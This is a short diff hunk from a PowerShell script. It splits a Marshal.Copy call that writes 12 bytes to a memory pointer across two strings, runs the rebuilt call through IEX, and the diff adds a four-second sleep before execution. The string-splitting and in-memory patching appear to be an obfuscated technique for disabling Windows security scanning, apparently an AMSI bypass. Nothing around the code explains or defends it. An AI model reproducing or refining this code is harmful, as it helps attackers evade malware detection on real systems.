@@ -52,4 +52,6 @@ $twelve = 12
 $a='[System.Runtime.InteropServices.Marshal]::Co'
 $b='py($in, $zero, $pointer, $twelve)'
 
+Start-Sleep 4
+
 IEX("$a{0}" -f $b)
